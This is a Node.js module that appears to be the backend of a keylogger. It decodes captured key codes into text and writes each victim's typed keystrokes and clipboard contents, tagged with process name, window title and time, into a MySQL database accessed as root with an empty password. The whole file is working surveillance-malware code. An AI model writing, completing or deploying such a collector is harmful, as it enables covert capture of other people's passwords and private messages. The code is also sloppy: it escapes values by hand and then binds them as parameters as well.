const mysql = require('mysql');
const keyTable = require('./keycodes.json');

// Connect to database
var db = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : '',
  database : 'lrc'
});
db.connect();

function resolveKeyCodes(keyCodes) {
    var text = '';

    for (var i = 0; i < keyCodes.length; i++) {

        var key = keyCodes[i];
        var keyCase = (key.flags == 0x0 || key.flags == 0x3) ? "lower" : "upper";

        if (keyTable['default']['both'][key.keyCode] != undefined) {
            text += keyTable['default']['both'][key.keyCode];
            continue;
        }
        
        if (keyTable['default'][keyCase] != undefined) {

            if (keyTable['default'][keyCase][key.keyCode] != undefined) {
                text += keyTable['default'][keyCase][key.keyCode];
                continue;
            }
        }
        
        if (keyTable[key.lang] != undefined) {
            if (keyTable[key.lang][keyCase] != undefined) {
                if (keyTable[key.lang][keyCase][key.keyCode] != undefined) {
                    text += keyTable[key.lang][keyCase][key.keyCode];
                    continue;
                }
            }
        }
    }

    return text;
}

function saveKeyboard(uid, data) {
    for (var i = 0; i < data.length; i++) {

        var process	= db.escape(data[i].wndInfo.process);
        var title	= db.escape(data[i].wndInfo.title);
        var text    = db.escape(resolveKeyCodes(data[i].keys));
        var time	= data[i].wndInfo.time;

        var query = 'INSERT INTO keyboard (uid, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
        var values = [uid, process, title, text, time];

        db.query(query, values, function(err, rows, fields) {
            if (err) {
                console.log(err);
            }
        });
    }
}

function saveClipboard(uid, data) {
    for (var i = 0; i < data.length; i++) {

        var process	= db.escape(data[i].wndInfo.process);
        var title	= db.escape(data[i].wndInfo.title);
        var text    = db.escape(data[i].keys);
        var time	= data[i].wndInfo.time;

        var query = 'INSERT INTO clipboard (uid, process, title, text, event_time) VALUES (?, ?, ?, ?, FROM_UNIXTIME(?))';
        var values = [uid, process, title, text, time];

        db.query(query, values, function(err, rows, fields) {
            if (err) {
                console.log(err);
            }
        });
    }
}

function saveData(uid, data) {
    switch (data.type) {
        // Keyboard
        case 1:
        saveKeyboard(uid, data.data.items);
        break;
        // Clipboard
        case 2:
        saveClipboard(uid, data.data.items);
        break;
    }
}

module.exports.saveData = saveData;